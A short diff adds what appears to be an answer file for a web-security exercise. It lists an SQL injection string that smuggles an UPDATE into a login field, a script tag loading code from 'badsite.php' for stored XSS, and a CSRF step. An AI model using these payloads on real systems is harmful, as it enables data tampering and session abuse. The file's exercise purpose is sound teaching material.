@@ -1,0 +1,8 @@
+SQL injection in login:
+"; UPDATE users SET address = "1337 Hacker Road"; #
+
+XSS comment:
+<script src="badsite.php"></script>
+
+CSRF:
+Visit homepage.php when logged in
